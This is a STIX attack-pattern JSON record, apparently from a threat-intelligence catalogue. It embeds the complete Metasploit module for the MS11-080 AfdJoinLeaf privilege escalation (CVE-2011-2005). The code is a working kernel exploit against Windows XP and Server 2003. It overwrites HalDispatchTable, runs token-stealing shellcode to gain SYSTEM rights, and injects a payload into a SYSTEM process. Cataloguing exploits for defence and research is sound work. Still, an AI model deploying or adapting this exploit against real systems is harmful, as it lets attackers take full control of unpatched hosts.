{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a6724afa-36bc-4c2d-bfac-d18044277529",
    "created": "2024-08-14T16:49:09.780812Z",
    "modified": "2024-08-14T16:49:09.780816Z",
    "name": "MS11-080 AfdJoinLeaf Privilege Escalation",
    "description": " This module exploits a flaw in the AfdJoinLeaf function of the afd.sys driver to overwrite data in kernel space.  An address within the HalDispatchTable is overwritten and when triggered with a call to NtQueryIntervalProfile will execute shellcode.  This module will elevate itself to SYSTEM, then inject the payload into another SYSTEM process before restoring its own token to avoid causing system instability.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms11_080_afdjoinleaf.rb",
            "external_id": "ms11_080_afdjoinleaf.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n  # Average because this module relies on memory corruption within the\n  # kernel, this is inherently dangerous.  Also if the payload casues\n  # the system process that it was injected into to die then it's also\n  # possible that the system may become unstable.\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'MS11-080 AfdJoinLeaf Privilege Escalation',\n          'Description' => %q{\n            This module exploits a flaw in the AfdJoinLeaf function of the\n            afd.sys driver to overwrite data in kernel space.  An address\n            within the HalDispatchTable is overwritten and when triggered\n            with a call to NtQueryIntervalProfile will execute shellcode.\n\n            This module will elevate itself to SYSTEM, then inject the payload\n            into another SYSTEM process before restoring its own token to\n            avoid causing system instability.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Matteo Memelli', # original exploit and all the hard work\n            'Spencer McIntyre' # MSF module\n          ],\n          'Arch' => [ARCH_X86],\n          'Platform' => ['win'],\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            ['Automatic', {}],\n            [\n              'Windows XP SP2 / SP3',\n              {\n                'HaliQuerySystemInfo' => 0x16bba,\n                'HalpSetSystemInformation' => 0x19436,\n                '_KPROCESS' => \"\\x44\",\n                '_TOKEN' => \"\\xc8\",\n                '_UPID' => \"\\x84\",\n                '_APLINKS' => \"\\x88\"\n              }\n            ],\n            [\n              'Windows Server 2003 SP2',\n              {\n                'HaliQuerySystemInfo' => 0x1fa1e,\n                'HalpSetSystemInformation' => 0x21c60,\n                '_KPROCESS' => \"\\x38\",\n                '_TOKEN' => \"\\xd8\",\n                '_UPID' => \"\\x94\",\n                '_APLINKS' => \"\\x98\"\n              }\n            ]\n          ],\n          'References' => [\n            %w[CVE 2011-2005],\n            %w[OSVDB 76232],\n            %w[EDB 18176],\n            %w[MSB MS11-080],\n            %w[URL http://www.offensive-security.com/vulndev/ms11-080-voyage-into-ring-zero/]\n          ],\n          'DisclosureDate' => '2011-11-30',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [\n              CRASH_OS_RESTARTS\n            ],\n            'Reliability' => [],\n            'SideEffects' => [\n              IOC_IN_LOGS,\n              ARTIFACTS_ON_DISK\n            ]\n          },\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_getpid\n                stdapi_sys_process_memory_protect\n                stdapi_sys_process_memory_write\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  # Function borrowed from smart_hashdump\n  def get_system_proc\n    # Make sure you got the correct SYSTEM Account Name no matter the OS Language\n    local_sys = resolve_sid('S-1-5-18')\n    system_account_name = \"#{local_sys[:domain]}\\\\#{local_sys[:name]}\"\n\n    # Processes that can Blue Screen a host if migrated in to\n    dangerous_processes = ['lsass.exe', 'csrss.exe', 'smss.exe']\n    session.sys.process.processes.each do |p|\n      # Check we are not migrating to a process that can BSOD the host\n      next if dangerous_processes.include?(p['name'])\n      next if p['pid'] == session.sys.process.getpid\n      next if p['pid'] == 4\n      next if p['user'] != system_account_name\n\n      return p\n    end\n  end\n\n  def exploit\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    mytarget = target\n    if mytarget.name =~ /Automatic/\n      version = get_version_info\n      mytarget = targets[1] if version.build_number.between?(Msf::WindowsVersion::XP_SP2, Msf::WindowsVersion::XP_SP3)\n      mytarget = targets[2] if version.build_number == Msf::WindowsVersion::Server2003_SP2\n\n      if mytarget.name =~ /Automatic/\n        print_error('Could not identify the target system, it may not be supported')\n        return\n      end\n      print_status(\"Running against #{mytarget.name}\")\n    end\n\n    if is_system?\n      print_error('This meterpreter session is already running as SYSTEM')\n      return\n    end\n\n    this_proc = session.sys.process.open\n    base_addr = 0x1001\n\n    result = session.railgun.ws2_32.WSASocketA('AF_INET', 'SOCK_STREAM', 'IPPROTO_TCP', nil, nil, 0)\n    socket = result['return']\n\n    irpstuff = rand_text_alpha(8)\n    irpstuff << \"\\x00\\x00\\x00\\x00\"\n    irpstuff << rand_text_alpha(4)\n    irpstuff << \"\\x01\\x00\\x00\\x00\"\n    irpstuff << \"\\xe8\\x00\\x34\\xf0\\x00\"\n    irpstuff << rand_text_alpha(231)\n\n    unless this_proc.memory.writable?(0x1000)\n      session.railgun.ntdll.NtAllocateVirtualMemory(-1, [base_addr].pack('V'), nil, [0x1000].pack('V'), 'MEM_COMMIT | MEM_RESERVE', 'PAGE_EXECUTE_READWRITE')\n    end\n    unless this_proc.memory.writable?(0x1000)\n      print_error('Failed to properly allocate memory')\n      return\n    end\n    this_proc.memory.write(0x1000, irpstuff)\n\n    haldispatchtable = find_haldispatchtable\n    return if haldispatchtable.nil?\n\n    halbase = find_sys_base('hal.dll')[0]\n    hal_iquerysysteminformation = halbase + mytarget['HaliQuerySystemInfo']\n    hal_psetsysteminformation = halbase + mytarget['HalpSetSystemInformation']\n    print_status(\"HaliQuerySystemInformation Address: 0x#{hal_iquerysysteminformation.to_s(16).rjust(8, '0')}\")\n    print_status(\"HalpSetSystemInformation Address: 0x#{hal_psetsysteminformation.to_s(16).rjust(8, '0')}\")\n\n    #### Exploitation ####\n    shellcode_address_dep = 0x0002071e\n    shellcode_address_nodep = 0x000207b8\n    padding = make_nops(2)\n    backup_token = 0x20900\n\n    restore_ptrs = \"\\x31\\xc0\"\n    restore_ptrs << \"\\xb8\" + [hal_psetsysteminformation].pack('V')\n    restore_ptrs << \"\\xa3\" + [haldispatchtable + 8].pack('V')\n    restore_ptrs << \"\\xb8\" + [hal_iquerysysteminformation].pack('V')\n    restore_ptrs << \"\\xa3\" + [haldispatchtable + 4].pack('V')\n\n    restore_token = \"\\x52\"\n    restore_token << \"\\x33\\xc0\"\n    restore_token << \"\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\"\n    restore_token << \"\\x8b\\x40\" + mytarget['_KPROCESS']\n    restore_token << \"\\x8b\\x15\" + [backup_token].pack('V')\n    restore_token << \"\\x89\\x90\" + mytarget['_TOKEN'] + \"\\x00\\x00\\x00\"\n    restore_token << \"\\x5a\"\n    restore_token << \"\\xc2\\x10\"\n\n    shellcode = padding + restore_ptrs + token_stealing_shellcode(mytarget, backup_token)\n\n    this_proc.memory.write(shellcode_address_dep, shellcode)\n    this_proc.memory.write(shellcode_address_nodep, shellcode)\n    this_proc.memory.protect(0x00020000)\n\n    addr = [2, 4455, 0x7f000001, 0, 0].pack('vvVVV')\n    result = session.railgun.ws2_32.connect(socket, addr, addr.length)\n    if result['return'] != 0xffffffff\n      print_error('The socket is not in the correct state')\n      return\n    end\n\n    print_status('Triggering AFDJoinLeaf pointer overwrite...')\n    session.railgun.ntdll.NtDeviceIoControlFile(socket, 0, 0, 0, 4, 0x000120bb, 0x1004, 0x108, haldispatchtable + 5, 0)\n    session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)\n\n    unless is_system?\n      print_error('Exploit failed')\n      return\n    end\n\n    proc = get_system_proc\n    print_status(\"Injecting the payload into SYSTEM process: #{proc['name']}\")\n    unless execute_shellcode(payload.encoded, nil, proc['pid'])\n      print_error('An error occurred while executing the payload')\n    end\n\n    # Restore the token because apparently BSODs are frowned upon\n    print_status('Restoring the original token...')\n    shellcode = padding + restore_ptrs + restore_token\n    this_proc.memory.write(shellcode_address_dep, shellcode)\n    this_proc.memory.write(shellcode_address_nodep, shellcode)\n\n    session.railgun.ntdll.NtDeviceIoControlFile(socket, 0, 0, 0, 4, 0x000120bb, 0x1004, 0x108, haldispatchtable + 5, 0)\n    session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-30",
    "x_mitre_platforms": [
        "['win']"
    ]
}